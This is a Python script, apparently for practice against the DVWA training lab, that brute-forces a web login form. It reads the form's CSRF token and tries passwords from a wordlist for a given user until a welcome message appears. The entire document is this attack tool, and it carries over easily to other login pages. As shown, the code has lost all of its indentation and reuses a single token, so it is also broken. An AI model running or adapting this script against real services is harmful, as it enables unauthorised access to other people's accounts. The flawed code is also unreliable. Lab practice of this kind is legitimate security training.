#!/usr/bin/env python3
# Requer: pip install requests
import requests
from bs4 import BeautifulSoup
import sys


if len(sys.argv) < 4:
print("Usage: dvwa_form_bruteforce.py <dvwa_url> <user> <wordlist>")
sys.exit(1)


url = sys.argv[1] # ex: http://192.168.56.21/dvwa/vulnerabilities/brute/
user = sys.argv[2]
wordlist = sys.argv[3]


s = requests.Session()
# Primeiro: obter token de sessão/csrf do form (DVWA usa token)
resp = s.get(url)
soup = BeautifulSoup(resp.text, 'html.parser')
try:
token = soup.find('input', {'name': 'user_token'})['value']
except Exception:
token = None


with open(wordlist) as f:
for pw in f:
pw = pw.strip()
data = {
'username': user,
'password': pw,
'Login': 'Login'
}
if token:
data['user_token'] = token
r = s.post(url, data=data)
if 'Welcome' in r.text or 'You have logged in' in r.text:
print(f"FOUND: {user}:{pw}")
break
print(f"Tried {user}:{pw}")
